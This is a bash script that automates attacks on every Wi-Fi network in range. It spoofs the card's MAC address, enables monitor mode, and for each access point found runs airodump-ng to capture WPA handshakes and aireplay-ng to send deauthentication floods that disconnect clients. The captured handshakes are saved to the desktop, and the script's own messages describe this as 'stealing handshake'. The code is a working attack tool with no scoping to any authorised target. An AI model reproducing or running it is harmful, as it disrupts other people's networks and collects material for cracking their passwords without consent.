#!/bin/bash

function cleanup()
{


echo "getting out of monitor mode"
airmon-ng stop wlan0mon
sleep 2
ifconfig wlan0 up

echo "lets go on"

mkdir -p /root/Desktop/handshakes
rm -rf -d /root/*.csv
rm -rf -d /root/*.netxml
mv /root/*.cap /root/Desktop/handshakes 


echo "now look on your desktop and you have a file with a lot of capture file"

}

echo "are you sure you wanna do this press enter when you are ready"
read


echo "Scanning all the AP's and temporarily saving them"
iwlist wlan0 scan > /tmp/scan.tmp
cat /tmp/scan.tmp | egrep "Address|Channel:" | cut -d \- -f 2 | sed -e "s/Address: //" | sed -e "s/Channel://" > /tmp/APad.tmp

echo "Your wirelesscard is now spoofing its mac address and getting in monitor mode"

ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
airmon-ng start wlan0
airmon-ng check kill

trap cleanup EXIT	

exec 5< /tmp/APad.tmp

	while read line1 <&5 ; do
        read line2 <&5	
			
		echo " now stealing handshake from $line1 on channel $line2 "
		echo
		
	gnome-terminal -x sh -c "airodump-ng -c $line2 --bssid $line1 --write $line1 wlan0mon; bash" &
	sleep 4
	xterm -geometry 50x20+0+0 -e "aireplay-ng -0 10 -a $line1 wlan0mon" & 
	sleep 4

done


